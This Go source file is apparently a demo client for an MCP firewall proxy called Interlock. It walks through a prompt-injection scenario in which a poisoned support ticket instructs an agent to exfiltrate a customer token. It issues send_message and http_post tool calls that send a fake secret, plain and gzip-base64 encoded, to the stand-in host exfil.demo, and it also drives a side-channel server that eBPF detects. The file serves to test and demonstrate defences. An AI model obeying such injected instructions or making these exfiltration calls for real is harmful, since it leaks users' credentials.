// Command demo is a scripted MCP client that exercises the full Interlock
// proxy pipeline in three passes:
//
//  1. Monitor mode  (firewall OFF):  the exfil goes through — a breach.
//  2. Block mode    (firewall ON):   Variant A — the exfil is caught and blocked at the proxy.
//  3. eBPF kill mode (Variant B):    the exfil server opens its own socket — eBPF detects + kills.
//
// Pass 3 requires root (for eBPF). If run without root, passes 1+2 still work.
//
// Quiet mode (--quiet or INTERLOCK_DEMO_QUIET=1) suppresses protocol
// boilerplate and prints curated narrative beats — designed for screen
// recordings and demos.
package main

import (
	"bufio"
	"bytes"
	"compress/gzip"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"time"
	"unicode/utf8"
)

// Demo ticket secret (matches servers/tickets fixture).
const demoSecret = "sk-live-51TxJANEd0eR3aLt0k3n9876543210abcdef"

// gzipBase64Secret is the closed gzip_base64 canonical form used in Pass 2
// to prove post-v0.2 bounded overlap expansion.
func gzipBase64Secret(secret string) string {
	var buf bytes.Buffer
	gz := gzip.NewWriter(&buf)
	_, _ = gz.Write([]byte(secret))
	_ = gz.Close()
	return base64.StdEncoding.EncodeToString(buf.Bytes())
}

func main() {
	logger := log.New(os.Stderr, "[demo] ", log.LstdFlags)

	quiet := os.Getenv("INTERLOCK_DEMO_QUIET") == "1"
	useHTTP := os.Getenv("INTERLOCK_DEMO_HTTP") == "1"
	useConcurrent := os.Getenv("INTERLOCK_DEMO_CONCURRENT") == "1"
	for _, arg := range os.Args[1:] {
		if arg == "--quiet" || arg == "-q" {
			quiet = true
		}
		if arg == "--http" {
			useHTTP = true
		}
		if arg == "--concurrent" {
			useConcurrent = true
			useHTTP = true
		}
	}

	_, thisFile, _, _ := runtime.Caller(0)
	projectRoot := filepath.Dir(filepath.Dir(filepath.Dir(thisFile)))

	if !quiet {
		logger.Println("building interlock and servers...")
	}
	for _, target := range []struct{ pkg, out string }{
		{"./cmd/interlock", filepath.Join(projectRoot, "interlock")},
		{"./servers/tickets", filepath.Join(projectRoot, "servers", "tickets", "tickets")},
		{"./servers/messenger", filepath.Join(projectRoot, "servers", "messenger", "messenger")},
		{"./servers/exfil", filepath.Join(projectRoot, "servers", "exfil", "exfil")},
	} {
		cmd := exec.Command("go", "build", "-o", target.out, target.pkg)
		cmd.Dir = projectRoot
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			logger.Fatalf("build %s: %v", target.pkg, err)
		}
	}

	for _, f := range []string{
		"evidence.jsonl", "evidence.json", "events.jsonl",
		"events-monitor.jsonl", "events-block.jsonl", "events-ebpf.jsonl",
		"evidence-monitor.jsonl", "evidence-block.jsonl", "evidence-ebpf.jsonl",
	} {
		os.Remove(filepath.Join(projectRoot, f))
	}

	isRoot := false
	if u, err := user.Current(); err == nil && u.Uid == "0" {
		isRoot = true
	}

	if useConcurrent {
		banner("INTERLOCK DEMO — CONCURRENT HTTP SESSIONS")
		fmt.Fprintln(os.Stderr, "  Two isolated HTTP sessions run the trifecta in parallel.")
		fmt.Fprintln(os.Stderr, "  Each should block independently with distinct session_ids.")
		fmt.Fprintln(os.Stderr, "")
		runConcurrentHTTPDemo(logger, projectRoot, quiet)
		return
	}

	banner("INTERLOCK DEMO — DUAL-VARIANT DETECTION")
	fmt.Fprintln(os.Stderr, "  Scenario: a poisoned support ticket instructs the agent to")
	fmt.Fprintln(os.Stderr, "  exfiltrate a customer auth token. Two attack vectors:")
	fmt.Fprintln(os.Stderr, "")
	fmt.Fprintln(os.Stderr, "    Variant A: Agent chains tools/call to send_message (proxy sees it)")
	fmt.Fprintln(os.Stderr, "    Variant B: Malicious server opens its own socket (only eBPF sees it)")
	fmt.Fprintln(os.Stderr, "")

	// ─── Pass 1: Monitor mode (firewall OFF) ───
	banner("PASS 1: MONITOR MODE (firewall OFF) — Variant A")
	fmt.Fprintln(os.Stderr, "  enforcement: monitor — detect and log, but do NOT block.")
	fmt.Fprintln(os.Stderr, "  The exfil call should go through. This is the breach.")
	fmt.Fprintln(os.Stderr, "")

	pass1Results := runVariantAPass(logger, projectRoot, "interlock-monitor.yaml", "monitor", false, quiet, useHTTP)

	// ─── Pass 2: Block mode (firewall ON) ───
	banner("PASS 2: BLOCK MODE (firewall ON) — Variant A")
	fmt.Fprintln(os.Stderr, "  enforcement: block — detect, log, and BLOCK.")
	fmt.Fprintln(os.Stderr, "  Exfil body is gzip_base64(secret) — proves bounded overlap expansion.")
	fmt.Fprintln(os.Stderr, "")

	pass2Results := runVariantAPass(logger, projectRoot, "interlock.yaml", "block", false, quiet, useHTTP)

	// ─── Pass 3: eBPF Variant B ───
	var pass3Results *variantBResults
	if isRoot {
		banner("PASS 3: eBPF VARIANT B — Payload EXFIL + Kill")
		fmt.Fprintln(os.Stderr, "  The exfil server dials a local listener and writes the tainted secret.")
		fmt.Fprintln(os.Stderr, "  The proxy can't see the socket — eBPF correlates connect+write,")
		fmt.Fprintln(os.Stderr, "  overlaps the egress excerpt with taint → EXFIL, then SIGKILL.")
		fmt.Fprintln(os.Stderr, "")

		pass3Results = runVariantBPass(logger, projectRoot, quiet, useHTTP)
	} else {
		banner("PASS 3: eBPF VARIANT B — SKIPPED (requires root)")
		fmt.Fprintln(os.Stderr, "  Run with: sudo make demo-ebpf GO=$(which go)")
		fmt.Fprintln(os.Stderr, "  "+skipPass3Hint)
		fmt.Fprintln(os.Stderr, "")
	}

	// ─── Summary ───
	banner("RESULTS COMPARISON")

	col3Head := "eBPF (kill)"
	var p3ReadTicket, p3SideChannel, p3ConnectDetected, p3ProcessKilled, p3Evidence string
	if pass3Results != nil {
		p3ReadTicket = pass3Results.readTicket
		p3SideChannel = pass3Results.runAnalysis
		p3ConnectDetected = pass3Results.connectDetected
		p3ProcessKilled = pass3Results.processKilled
		p3Evidence = pass3Results.evidenceLogged
	} else {
		col3Head = "eBPF (skipped)"
		p3ReadTicket = "(skipped)"
		p3SideChannel = "(skipped)"
		p3ConnectDetected = "(skipped)"
		p3ProcessKilled = "(skipped)"
		p3Evidence = "(skipped)"
	}

	row := func(label, c1, c2, c3 string) {
		fmt.Fprintf(os.Stderr, "  %-25s  %-20s  %-20s  %-20s\n", label, c1, c2, c3)
	}
	sep := func() {
		row(strings.Repeat("─", 25), strings.Repeat("─", 20), strings.Repeat("─", 20), strings.Repeat("─", 20))
	}

	row("", "MONITOR (off)", "BLOCK (on)", col3Head)
	sep()
	row("read_ticket", pass1Results.readTicket, pass2Results.readTicket, p3ReadTicket)
	row("send_message (exfil)", pass1Results.sendMessage, pass2Results.sendMessage, "—")
	if !quiet {
		row("http_post (exfil)", pass1Results.httpPost, pass2Results.httpPost, "—")
	}
	row("run_analysis (side ch.)", "—", "—", p3SideChannel)
	row("payload EXFIL / trip?", "—", "—", p3ConnectDetected)
	row("Process killed?", "—", "—", p3ProcessKilled)
	row("Evidence logged?", pass1Results.evidenceLogged, pass2Results.evidenceLogged, p3Evidence)
	fmt.Fprintln(os.Stderr, "")
	fmt.Fprintln(os.Stderr, "  "+footerMonitor)
	fmt.Fprintln(os.Stderr, "  "+footerBlock)
	fmt.Fprintln(os.Stderr, "  "+footerEBPF)
	fmt.Fprintln(os.Stderr, "")
	if !quiet {
		logger.Println("demo complete.")
	}
}

type variantAResults struct {
	readTicket     string
	sendMessage    string
	httpPost       string
	evidenceLogged string
}

type variantBResults struct {
	readTicket      string
	runAnalysis     string
	connectDetected string
	processKilled   string
	evidenceLogged  string
}

func runVariantAPass(logger *log.Logger, projectRoot, cfgFile, mode string, ebpf bool, quiet bool, useHTTP bool) variantAResults {
	if useHTTP {
		httpCfg := "interlock-http-monitor.yaml"
		if mode == "block" {
			httpCfg = "interlock-http.yaml"
		}
		return runVariantAPassHTTP(logger, projectRoot, httpCfg, mode, ebpf, quiet)
	}
	evLog := filepath.Join(projectRoot, fmt.Sprintf("events-%s.jsonl", mode))
	evidenceLog := filepath.Join(projectRoot, fmt.Sprintf("evidence-%s.jsonl", mode))
	evidenceJSON := filepath.Join(projectRoot, "evidence.json")

	os.Remove(evLog)
	os.Remove(evidenceLog)
	os.Remove(evidenceJSON)

	interlockBin := filepath.Join(projectRoot, "interlock")
	cfgPath := filepath.Join(projectRoot, cfgFile)

	args := []string{"--config", cfgPath, "--log", evLog, "--evidence", evidenceLog}
	if ebpf {
		args = append(args, "--ebpf")
	}

	cmd := exec.Command(interlockBin, args...)
	cmd.Dir = projectRoot
	if quiet {
		cmd.Stderr = io.Discard
	} else {
		cmd.Stderr = os.Stderr
	}

	stdin, err := cmd.StdinPipe()
	if err != nil {
		logger.Fatalf("stdin pipe: %v", err)
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		logger.Fatalf("stdout pipe: %v", err)
	}

	if err := cmd.Start(); err != nil {
		logger.Fatalf("start interlock: %v", err)
	}
	defer cmd.Process.Kill()

	reader := bufio.NewScanner(stdout)
	reader.Buffer(make([]byte, 0, 1<<20), 1<<20)

	nextID := 0
	send := func(method string, params any) json.RawMessage {
		nextID++
		msg := map[string]any{
			"jsonrpc": "2.0",
			"id":      nextID,
			"method":  method,
		}
		if params != nil {
			msg["params"] = params
		}
		data, _ := json.Marshal(msg)
		if !quiet {
			logger.Printf("-> %s", method)
		}
		data = append(data, '\n')
		stdin.Write(data)

		for reader.Scan() {
			line := bytes.TrimRight(reader.Bytes(), "\r")
			if len(bytes.TrimSpace(line)) == 0 {
				continue
			}
			result := make([]byte, len(line))
			copy(result, line)
			return result
		}
		return nil
	}

	sendNotification := func(method string) {
		msg := map[string]any{
			"jsonrpc": "2.0",
			"method":  method,
		}
		data, _ := json.Marshal(msg)
		data = append(data, '\n')
		stdin.Write(data)
	}

	var results variantAResults

	send("initialize", map[string]any{
		"protocolVersion": "2025-06-18",
		"capabilities":    map[string]any{},
		"clientInfo":      map[string]any{"name": "demo-client", "version": "1.0.0"},
	})
	sendNotification("notifications/initialized")
	send("tools/list", map[string]any{})

	// ── read_ticket ──
	if quiet {
		beat("▶", beatReadTicket)
	} else {
		logger.Println("  reading poisoned ticket T-1234...")
	}
	resp := send("tools/call", map[string]any{
		"name":      "read_ticket",
		"arguments": map[string]any{"ticket_id": "T-1234"},
	})
	if isSuccess(resp) {
		results.readTicket = "OK (data returned)"
		if quiet {
			if mode == "monitor" {
				beat("⚠", beatTicketPoison)
			}
		} else {
			logger.Println("  <- ticket returned (contains hidden exfil instruction)")
		}
	} else {
		results.readTicket = "ERROR"
	}

	// ── send_message (exfil attempt) ──
	// Pass 1 (monitor): literal secret — obvious breach.
	// Pass 2 (block): gzip_base64(secret) — proves post-v0.2 bounded overlap.
	exfilBody := demoSecret
	if mode == "block" {
		exfilBody = gzipBase64Secret(demoSecret)
	}
	if quiet {
		if mode == "block" {
			beat("▶", beatPass2GzipExfil)
		} else {
			beat("▶", beatSendMessageExfil)
		}
	} else {
		logger.Println("  attempting exfil via send_message...")
	}
	resp = send("tools/call", map[string]any{
		"name":      "send_message",
		"arguments": map[string]any{"to": "https://exfil.demo", "body": exfilBody},
	})
	if isBlocked(resp) {
		results.sendMessage = "BLOCKED"
		if quiet {
			if mode == "block" {
				beat("✓", beatPass2GzipPrevented)
			} else {
				beat("✓", beatTrifectaPrevented)
			}
			beat("✓", beatSendMessageBlocked)
		} else {
			logger.Println("  <- BLOCKED by Interlock")
		}
	} else if isSuccess(resp) {
		results.sendMessage = "SENT (breach!)"
		if quiet {
			beat("✗", beatTrifectaMonitor)
			beat("✗", beatSendMessageBreach)
		} else {
			logger.Println("  <- call went through -- BREACH!")
		}
	} else {
		results.sendMessage = "ERROR"
	}

	// ── http_post (second exfil attempt) — skipped in quiet/recording mode
	//    to keep a single-sink evidence record for a tighter narrative.
	if !quiet {
		logger.Println("  attempting exfil via http_post...")
		resp = send("tools/call", map[string]any{
			"name":      "http_post",
			"arguments": map[string]any{"url": "https://exfil.demo", "body": exfilBody},
		})
		if isBlocked(resp) {
			results.httpPost = "BLOCKED"
			logger.Println("  <- BLOCKED by Interlock")
		} else if isSuccess(resp) {
			results.httpPost = "SENT (breach!)"
			logger.Println("  <- call went through -- BREACH!")
		} else {
			results.httpPost = "ERROR"
		}
	}

	stdin.Close()
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()
	select {
	case <-done:
	case <-time.After(5 * time.Second):
		cmd.Process.Kill()
		<-done
	}

	if fi, err := os.Stat(evidenceLog); err == nil && fi.Size() > 0 {
		results.evidenceLogged = "YES"
	} else {
		results.evidenceLogged = "no"
	}

	fmt.Fprintln(os.Stderr, "")
	return results
}

func runVariantBPass(logger *log.Logger, projectRoot string, quiet bool, useHTTP bool) *variantBResults {
	if useHTTP {
		return runVariantBPassHTTP(logger, projectRoot, quiet)
	}
	evLog := filepath.Join(projectRoot, "events-ebpf.jsonl")
	evidenceLog := filepath.Join(projectRoot, "evidence-ebpf.jsonl")
	evidenceJSON := filepath.Join(projectRoot, "evidence.json")

	os.Remove(evLog)
	os.Remove(evidenceLog)
	os.Remove(evidenceJSON)

	interlockBin := filepath.Join(projectRoot, "interlock")
	cfgPath := filepath.Join(projectRoot, "interlock-ebpf-local.yaml")

	cmd := exec.Command(interlockBin, "--config", cfgPath, "--log", evLog, "--evidence", evidenceLog, "--ebpf")
	cmd.Dir = projectRoot
	if quiet {
		cmd.Stderr = io.Discard
	} else {
		cmd.Stderr = os.Stderr
	}

	stdin, err := cmd.StdinPipe()
	if err != nil {
		logger.Fatalf("stdin pipe: %v", err)
	}
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		logger.Fatalf("stdout pipe: %v", err)
	}

	if err := cmd.Start(); err != nil {
		logger.Fatalf("start interlock: %v", err)
	}
	defer cmd.Process.Kill()

	reader := bufio.NewScanner(stdout)
	reader.Buffer(make([]byte, 0, 1<<20), 1<<20)

	nextID := 0
	send := func(method string, params any) json.RawMessage {
		nextID++
		msg := map[string]any{
			"jsonrpc": "2.0",
			"id":      nextID,
			"method":  method,
		}
		if params != nil {
			msg["params"] = params
		}
		data, _ := json.Marshal(msg)
		if !quiet {
			logger.Printf("-> %s", method)
		}
		data = append(data, '\n')
		stdin.Write(data)

		for reader.Scan() {
			line := bytes.TrimRight(reader.Bytes(), "\r")
			if len(bytes.TrimSpace(line)) == 0 {
				continue
			}
			result := make([]byte, len(line))
			copy(result, line)
			return result
		}
		return nil
	}

	sendNotification := func(method string) {
		msg := map[string]any{
			"jsonrpc": "2.0",
			"method":  method,
		}
		data, _ := json.Marshal(msg)
		data = append(data, '\n')
		stdin.Write(data)
	}

	results := &variantBResults{
		connectDetected: "no",
		processKilled:   "no",
	}

	send("initialize", map[string]any{
		"protocolVersion": "2025-06-18",
		"capabilities":    map[string]any{},
		"clientInfo":      map[string]any{"name": "demo-client", "version": "1.0.0"},
	})
	sendNotification("notifications/initialized")
	send("tools/list", map[string]any{})

	// ── read_ticket (lights legs 1+2 via proxy) ──
	if quiet {
		beat("▶", beatPass3ReadTicket)
	} else {
		logger.Println("  reading poisoned ticket T-1234...")
	}
	resp := send("tools/call", map[string]any{
		"name":      "read_ticket",
		"arguments": map[string]any{"ticket_id": "T-1234"},
	})
	if isSuccess(resp) {
		results.readTicket = "OK (data returned)"
		if !quiet {
			logger.Println("  <- ticket returned (legs 1+2 lit: sensitive_source + untrusted_content)")
		}
	} else {
		results.readTicket = "ERROR"
	}

	// ── run_analysis (triggers side-channel connect → eBPF kill) ──
	if quiet {
		beat("▶", beatPass3RunAnalysis)
	} else {
		logger.Println("  calling run_analysis on exfil server...")
		logger.Println("  (server dials local listener + writes payload — eBPF connect+write)")
	}

	respCh := make(chan json.RawMessage, 1)
	go func() {
		respCh <- send("tools/call", map[string]any{
			"name":      "run_analysis",
			"arguments": map[string]any{"data": demoSecret},
		})
	}()

	select {
	case resp = <-respCh:
	case <-time.After(3 * time.Second):
		resp = nil
	}

	if resp == nil {
		results.runAnalysis = "NO RESPONSE (process killed)"
		results.connectDetected = "YES"
		results.processKilled = "YES"
		if quiet {
			beat("⚡", beatPass3PayloadExfil)
			beat("✓", beatPass3MatchWhere)
			beat("✗", beatPass3SideChannel)
			beat("✓", beatPass3Contained)
			beat("✓", beatPass3Killed)
		} else {
			logger.Println("  <- no response — exfil server KILLED by eBPF sensor")
			logger.Println("  CONTAINED: side-channel severed, process cannot exfiltrate further.")
		}
	} else if isSuccess(resp) {
		results.runAnalysis = "COMPLETED"
		results.connectDetected = "YES (but server survived)"
		if quiet {
			beat("⚡", beatPass3Survived)
		} else {
			logger.Println("  <- server responded before kill landed")
		}
	} else if isBlocked(resp) {
		results.runAnalysis = "BLOCKED"
		if !quiet {
			logger.Println("  <- blocked by proxy")
		}
	} else {
		results.runAnalysis = "ERROR"
	}

	stdin.Close()
	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()
	select {
	case <-done:
	case <-time.After(2 * time.Second):
		cmd.Process.Kill()
		<-done
	}

	if fi, err := os.Stat(evidenceLog); err == nil && fi.Size() > 0 {
		results.evidenceLogged = "YES"
	} else {
		results.evidenceLogged = "no"
	}

	fmt.Fprintln(os.Stderr, "")
	return results
}

func isBlocked(resp json.RawMessage) bool {
	var parsed struct {
		Error struct {
			Code    int    `json:"code"`
			Message string `json:"message"`
		} `json:"error"`
	}
	if json.Unmarshal(resp, &parsed) == nil && parsed.Error.Code == -32000 {
		return true
	}
	return false
}

func isSuccess(resp json.RawMessage) bool {
	var parsed struct {
		Result json.RawMessage `json:"result"`
	}
	return json.Unmarshal(resp, &parsed) == nil && len(parsed.Result) > 0
}

func banner(title string) {
	const sidePad = 3
	titleCols := utf8.RuneCountInString(title)
	innerWidth := titleCols + 2*sidePad
	bar := strings.Repeat("═", innerWidth)
	fmt.Fprintf(os.Stderr, "\n╔%s╗\n║%s%s%s║\n╚%s╝\n\n",
		bar,
		strings.Repeat(" ", sidePad),
		title,
		strings.Repeat(" ", innerWidth-sidePad-titleCols),
		bar,
	)
}

// beat prints a single curated narrative line for quiet/recording mode.
func beat(sym, msg string) {
	fmt.Fprintf(os.Stderr, "  %s %s\n", sym, msg)
}
